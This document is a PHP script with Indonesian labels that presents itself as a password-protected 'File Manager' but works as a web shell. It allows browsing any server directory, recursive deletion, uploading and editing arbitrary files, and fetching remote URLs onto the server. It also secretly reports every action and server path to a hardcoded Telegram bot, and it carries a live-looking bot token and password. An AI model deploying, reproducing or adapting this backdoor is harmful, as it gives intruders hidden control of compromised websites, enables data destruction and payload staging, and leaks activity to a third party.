<?php
// --- Konfigurasi --- //
session_start();
$pass = 'alalacinta';
$botToken = '8161188245:AAFTyqNTbegh0ruXaGrGKzH_oCPeNl4MWmg';
$chatId   = '7973648686';

function kirim_telegram($pesan, $botToken, $chatId) {
    if (!$botToken || !$chatId) return;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($pesan);
    @file_get_contents($url);
}

// --- LOGIN --- //
if (!isset($_SESSION['login_ok'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $pass) {
        $_SESSION['login_ok'] = 1;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    ?>
    <html>
    <head>
        <title>Panel</title>
        <style>
            body {background:#eaeef2;font-family:sans-serif;}
            .box {max-width:330px;margin:120px auto;padding:25px 22px;background:#fff;border-radius:12px;box-shadow:0 6px 22px #304c8955;}
            input,button {padding:9px;width:96%;margin-top:10px;border-radius:6px;border:1px solid #dde;}
            button {background:#304c89;color:#fff;}
        </style>
    </head>
    <body>
        <div class="box">
            <h3>Login</h3>
            <form method="post">
                <input type="password" name="pass" placeholder="Password" autofocus required><br>
                <button>Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

function permission($file) {
    return substr(sprintf('%o', @fileperms($file)), -4);
}
function formatBytes($size) {
    if ($size >= 1073741824) return number_format($size / 1073741824, 2) . ' GB';
    elseif ($size >= 1048576) return number_format($size / 1048576, 2) . ' MB';
    elseif ($size >= 1024) return number_format($size / 1024, 2) . ' KB';
    elseif ($size > 1) return $size . ' bytes';
    elseif ($size == 1) return $size . ' byte';
    else return '0 bytes';
}

$dir = isset($_GET['d']) ? $_GET['d'] : '.';
$abs = realpath($dir);

if (isset($_GET['del'])) {
    $target = $dir . '/' . $_GET['del'];
    if (is_dir($target)) {
        function rmdir_recursive($dir) {
            foreach (scandir($dir) as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = $dir . '/' . $item;
                if (is_dir($path)) rmdir_recursive($path);
                else @unlink($path);
            }
            @rmdir($dir);
        }
        rmdir_recursive($target);
        kirim_telegram("🗑️ Hapus folder: {$_GET['del']}\nPath: $abs", $botToken, $chatId);
    } elseif (is_file($target)) {
        @unlink($target);
        kirim_telegram("🗑️ Hapus file: {$_GET['del']}\nPath: $abs", $botToken, $chatId);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?d=' . urlencode($dir));
    exit;
}

if (!empty($_FILES['upload']['name'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $dir . '/' . $_FILES['upload']['name']);
    kirim_telegram("📥 Upload: {$_FILES['upload']['name']}\nPath: $abs", $botToken, $chatId);
}

if (isset($_POST['newfolder']) && $_POST['foldername']) {
    mkdir($dir . '/' . $_POST['foldername']);
    kirim_telegram("📂 Folder baru: {$_POST['foldername']}\nPath: $abs", $botToken, $chatId);
}

if (isset($_POST['newfile']) && $_POST['filename']) {
    file_put_contents($dir . '/' . $_POST['filename'], $_POST['filecontent']);
    kirim_telegram("📝 File baru: {$_POST['filename']}\nPath: $abs", $botToken, $chatId);
}

if (isset($_POST['downurl']) && $_POST['url'] && $_POST['filename2']) {
    file_put_contents($dir . '/' . $_POST['filename2'], @file_get_contents($_POST['url']));
    kirim_telegram("🌐 Download URL: {$_POST['url']} ke {$_POST['filename2']}\nPath: $abs", $botToken, $chatId);
}

$zip_supported = class_exists('ZipArchive');
if ($zip_supported && isset($_POST['dozip']) && $_POST['zipname'] && $_POST['zipitem']) {
    $zipfile = $dir . '/' . $_POST['zipname'];
    $target = $dir . '/' . $_POST['zipitem'];
    $zip = new ZipArchive();
    if ($zip->open($zipfile, ZipArchive::CREATE) === TRUE) {
        if (is_file($target)) {
            $zip->addFile($target, basename($target));
        } elseif (is_dir($target)) {
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($files as $item) {
                if ($item->isFile()) {
                    $zip->addFile($item, substr($item, strlen("$target/")));
                }
            }
        }
        $zip->close();
        kirim_telegram("🗜️ ZIP: ".$_POST['zipitem']." => ".$_POST['zipname']."\nPath: $abs", $botToken, $chatId);
    }
}

if ($zip_supported && isset($_POST['unzip']) && $_POST['unzipfile']) {
    $zipfile = $dir . '/' . $_POST['unzipfile'];
    $zip = new ZipArchive();
    if ($zip->open($zipfile) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
        kirim_telegram("🗜️ UNZIP: ".$_POST['unzipfile']."\nPath: $abs", $botToken, $chatId);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
    body { background:#f4f7fa;font-family:sans-serif;color:#222;margin:0; }
    #main { max-width:950px;margin:30px auto 50px auto;padding:30px 22px 20px 22px;background:#fff;border-radius:18px;box-shadow:0 6px 26px #294c8912; }
    h3 {margin-top:0;}
    .logout {float:right;color:#c43333;text-decoration:none;margin-top:10px;}
    .path-box {background:#edeffc;border-radius:8px;padding:10px 14px;margin-bottom:22px;font-size:1.11em;}
    .actions-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit,minmax(260px,1fr));
        gap: 13px;
        margin-bottom: 13px;
    }
    .actions-grid form {
        background: #f6f8fd;
        border-radius: 7px;
        padding: 15px 16px 11px 16px;
        box-shadow:0 2px 8px #294c8907;
        display: flex;
        flex-direction: column;
        align-items: stretch;
    }
    .actions-grid input[type="text"], .actions-grid input[type="file"], .actions-grid textarea, .actions-grid select {
        margin-bottom: 7px;
        font-size:1em;
        border-radius:5px;
        border:1px solid #ccd2dd;
        padding:7px;
    }
    .actions-grid button {
        background:#304c89;
        color:#fff;
        border:none;
        padding:8px 0;
        border-radius:5px;
        font-size:1em;
        transition:.14s;
        cursor:pointer;
    }
    .actions-grid button:hover {background:#425ba9;}
    .zip-row {
        display: flex;
        flex-wrap: wrap;
        gap: 18px;
        background:#f6f8fd;
        border-radius:7px;
        padding: 13px 10px 7px 10px;
        margin-bottom: 17px;
        align-items: center;
        justify-content: flex-start;
    }
    .zip-row select, .zip-row input[type="text"] {margin-bottom:0;}
    .zip-row button {margin-bottom:0;}
    table{width:100%;border-collapse:collapse;background:#f8fafc;margin-top:12px;}
    th,td {padding:9px 4px;}
    tr:nth-child(even){background:#f3f7fd;}
    a { color:#2a63d7; text-decoration:none;}
    a:hover {text-decoration:underline;}
    .aksi {white-space:nowrap;}
    @media (max-width:800px) {
        #main {padding:8px;}
        .actions-grid {grid-template-columns:1fr;}
        .zip-row {flex-direction: column;align-items: stretch;}
    }
    </style>
</head>
<body>
<div id="main">
<a href="?logout=1" class="logout">Logout</a>
<h3>File Manager</h3>
<div class="path-box"><b>Path:</b> <?php echo $abs;?></div>

<div class="actions-grid">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload" required>
        <button>Upload</button>
    </form>
    <form method="post">
        <input type="text" name="foldername" placeholder="Nama folder" required>
        <button name="newfolder">Buat Folder</button>
    </form>
    <form method="post">
        <input type="text" name="filename" placeholder="file.txt" required>
        <textarea name="filecontent" placeholder="Isi file..." rows="2" style="width:100%;resize:vertical;"></textarea>
        <button name="newfile">Buat File</button>
    </form>
    <form method="post">
        <input type="text" name="url" placeholder="https://domain.com/file.txt" required>
        <input type="text" name="filename2" placeholder="nama_simpan.txt" required>
        <button name="downurl">Ambil URL</button>
    </form>
</div>

<?php if ($zip_supported): ?>
<div class="zip-row">
    <form method="post" style="display:flex;gap:9px;align-items:center;">
        <select name="zipitem" required>
            <option value="">--ZIP file/folder--</option>
            <?php foreach(scandir($dir) as $f) {
                if($f=='.'||$f=='..') continue;
                echo "<option value=\"".htmlspecialchars($f)."\">$f</option>";
            }?>
        </select>
        <input type="text" name="zipname" placeholder="arsip.zip" style="width:110px;" required>
        <button name="dozip">ZIP</button>
    </form>
    <form method="post" style="display:flex;gap:9px;align-items:center;">
        <select name="unzipfile" required>
            <option value="">--Unzip file--</option>
            <?php foreach(scandir($dir) as $f) {
                if(strtolower(pathinfo($f,PATHINFO_EXTENSION))=='zip')
                    echo "<option value=\"".htmlspecialchars($f)."\">$f</option>";
            }?>
        </select>
        <button name="unzip">UNZIP</button>
    </form>
</div>
<?php endif; ?>

<?php
if ($dir != '.' && $dir != '/') echo "<a href='?d=" . urlencode(dirname($dir)) . "' style='font-size:1.2em;'>⬅️ Atas</a><br>";
echo "<table><tr><th>Nama</th><th>Tipe</th><th>Ukuran</th><th>Perms</th><th>Aksi</th></tr>";
foreach (scandir($dir) as $f) {
    if ($f == '.') continue;
    $path = "$dir/$f";
    $isdir = is_dir($path);
    echo "<tr><td>";
    if ($isdir) echo "<a href='?d=" . urlencode($path) . "'>📁 $f</a>";
    else echo "<a href='?d=" . urlencode($dir) . "&edit=" . urlencode($f) . "'>📄 $f</a>";
    echo "</td><td>" . ($isdir ? 'Folder' : 'File') . "</td>";
    echo "<td>" . ($isdir ? '-' : formatBytes(filesize($path))) . "</td>";
    echo "<td>" . permission($path) . "</td>";
    echo "<td class='aksi'>";
    if (!$isdir) echo "<a href='?d=" . urlencode($dir) . "&edit=" . urlencode($f) . "'>✏️ Edit</a> ";
    echo "<a href='?d=" . urlencode($dir) . "&del=" . urlencode($f) . "' onclick=\"return confirm('Hapus $f?')\">🗑️ Hapus</a>";
    echo "</td></tr>";
}
echo "</table>";

if (isset($_GET['edit']) && is_file("$dir/".$_GET['edit'])) {
    $file = "$dir/".$_GET['edit'];
    $content = htmlspecialchars(file_get_contents($file));
    echo "<hr><h4>Edit: {$_GET['edit']}</h4>
    <form method='post'>
    <textarea name='filecontent' rows='13' style='width:99%;resize:vertical;'>$content</textarea><br>
    <input type='hidden' name='filename' value='{$_GET['edit']}'>
    <button name='newfile'>Simpan Perubahan</button>
    </form>";
}
?>
</div>
</body>
</html>
